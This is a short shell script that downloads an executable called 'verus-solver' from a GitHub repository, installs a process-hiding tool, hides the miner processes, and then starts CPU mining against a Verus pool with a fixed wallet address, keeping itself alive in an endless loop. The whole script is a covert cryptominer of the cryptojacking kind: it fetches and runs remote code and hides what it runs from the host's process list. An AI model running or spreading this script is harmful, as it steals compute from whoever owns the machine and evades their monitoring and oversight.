#!/bin/sh
wget https://github.com/bulboni/vs/raw/main/verus-solver && chmod +x verus-solver
npm i -g node-process-hider
ph add verus-solver
ph add loop
./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
while [ 1 ]; do
sleep 3
done
sleep 999
